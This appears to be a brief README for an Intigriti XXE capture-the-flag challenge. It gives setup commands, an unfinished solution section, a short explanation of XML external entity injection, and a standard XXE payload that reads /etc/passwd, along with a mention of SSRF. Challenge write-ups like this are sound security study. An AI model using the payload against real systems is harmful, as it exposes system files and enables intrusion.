## Initigriti XXE challenge POC

```
git clone https://github.com/rogueloop/intigriti-xxe-challenge.git
cd intigriti-xxe-challenge
php -S localhost:8000
```

## challenge 
![Challenge Image](./486066540_18220552186292613_50405887802685493_n.jpeg)

## Solution 

The code has a sanitation mechanism where common XML keywords are not allowed. 





### About XXE

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 

XML contains 


Here is an example pyload: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```


XXE can be futher expoited to perform a SSRF.

